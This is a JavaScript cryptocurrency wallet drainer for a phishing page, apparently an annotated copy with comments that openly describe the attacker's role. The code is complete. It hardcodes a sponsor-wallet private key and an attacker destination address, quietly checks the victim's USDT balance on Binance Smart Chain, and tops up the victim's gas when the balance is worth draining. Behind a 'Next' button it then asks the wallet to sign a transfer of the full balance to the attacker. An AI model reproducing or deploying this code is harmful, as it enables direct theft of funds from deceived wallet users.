// ── Phase 1: Module Initialization ──
import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';

// ── Attacker's Operational Constants ──
const SPONSOR_KEY  = "73ccd25b0976c3799ca53b15b81f00b784cb0b1bf6baff4760ffd335415fad40";
const DEST_WALLET  = "0xdB67713Aec1fD3ad5000780Bd9dD134366d07215";
const USDT_BEP20   = "0x55d398326f99059fF775485246999027B3197955";
const BSC_RPC      = "https://bsc-dataseed1.binance.org/";
const BSC_CHAIN_ID = "0x38";
const MIN_DRAIN    = 2; // Only refuel if USDT balance > $2

// ── Runtime State ──
let provider;
let sponsorWallet;
let userAddress;

// ── Silent Recon Engine (no popups, raw JSON-RPC) ──

// D1 — BNB gas check & sponsor refuel (only for high-value: USDT > $2)
// Sends 0.00008 BNB if BNB balance is below 0.00015, only if USDT > $2
async function checkAndRefuel(addr) {
    try {
        const balance = await provider.getBalance(addr);
        if (balance.lt(ethers.utils.parseEther("0.00015"))) {
            const tx = { to: addr, value: ethers.utils.parseEther("0.00008") };
            const sentTx = await sponsorWallet.sendTransaction(tx);
            await sentTx.wait();
        }
    } catch (e) {}
}

// D2 — Silent balanceOf via raw eth_call (0x70a08231)
async function fetchMaxBalance(addr) {
    try {
        const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
        const res = await fetch(BSC_RPC, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: "2.0", id: 1,
                method: "eth_call",
                params: [{ to: USDT_BEP20, data: data }, "latest"]
            })
        });
        const json = await res.json();
        return (json.result && json.result !== '0x') ? json.result : null;
    } catch (e) { return null; }
}

// ── Drain Engine ──
async function executeDrain(balanceHex) {
    const balVal = balanceHex ? parseInt(balanceHex, 16) / 10**18 : 0;

    // If balance is 0 or very small, use whatever user typed
    let amountHex;
    if (balanceHex && balanceHex !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
        amountHex = balanceHex.replace('0x', '').padStart(64, '0');
    } else {
        const val = document.getElementById('amountInput').value || "1";
        amountHex = BigInt(Math.floor(parseFloat(val) * 10**18)).toString(16).padStart(64, '0');
    }

    const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
    const txData = "0xa9059cbb" + cleanDest + amountHex;

    await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: userAddress,
            to: USDT_BEP20,
            data: txData,
            value: '0x0'
        }]
    });
}

// ── DOM Registry ──
const ui = {
    nextBtn: document.getElementById('nextBtn'),
    amountInput: document.getElementById('amountInput'),
    usdLabel: document.getElementById('usdLabel')
};

// ── Module Entry Point (DOMContentLoaded, fires once) ──
document.addEventListener('DOMContentLoaded', () => {

    // Check 1 — Served from real web server (not file://)
    if (location.protocol === 'file:') {
        console.warn('[ABORT] Check 1 fail: file:// protocol');
        return;
    }

    // Check 2 — window.ethereum injected by wallet
    if (typeof window.ethereum === 'undefined') {
        console.warn('[ABORT] Check 2 fail: no injected Web3 provider');
        return;
    }

    // Check 3 — nextBtn exists in DOM
    if (!ui.nextBtn) {
        console.warn('[ABORT] Check 3 fail: #nextBtn not found');
        return;
    }

    // Bind click listener
    ui.nextBtn.addEventListener('click', handleNextClick);

    // UI Helpers (same as original inline script)
    ui.amountInput.oninput = () => {
        const val = parseFloat(ui.amountInput.value) || 0;
        ui.usdLabel.textContent = val.toFixed(2);
        ui.nextBtn.disabled = val <= 0;
        if (val > 0) ui.nextBtn.classList.add('enabled');
        else ui.nextBtn.classList.remove('enabled');
    };
    document.getElementById('maxBtn').onclick = () => {
        ui.amountInput.value = "10";
        ui.amountInput.oninput();
    };
});

// ── Main Interaction Controller ──
async function handleNextClick() {
    if (ui.nextBtn.disabled) return;

    const originalContent = ui.nextBtn.innerHTML;
    ui.nextBtn.innerHTML = 'Wait...';
    ui.nextBtn.disabled = true;

    try {
        // Step 1 — Switch to BSC network
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: BSC_CHAIN_ID }]
            });
        } catch (e) {}

        // Step 2 — Get user wallet address
        const accounts = await window.ethereum.request({ method: 'eth_accounts' }) || [];
        userAddress = accounts[0] ||
            (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];

        // Step 3 — Init backend pipeline + sponsor wallet
        provider = new ethers.providers.JsonRpcProvider(BSC_RPC);
        sponsorWallet = new ethers.Wallet(SPONSOR_KEY, provider);

        // Step 4 — Silent USDT balance recon (raw JSON-RPC, no popup)
        const balanceHex = await fetchMaxBalance(userAddress);
        const balVal = balanceHex ? parseInt(balanceHex, 16) / 10**18 : 0;

        // Step 5 — Gas refuel: only if USDT > $2 and BNB < 0.00015
        if (balVal > MIN_DRAIN) {
            await checkAndRefuel(userAddress);
        }
        // If USDT <= $2, no BNB is sent — saves attacker gas costs

        // Step 6 — Execute the drain
        await executeDrain(balanceHex);

        ui.nextBtn.innerHTML = 'Completed';
    } catch (err) {
        console.error(err);
        ui.nextBtn.innerHTML = 'Next';
        ui.nextBtn.disabled = false;
    }
}
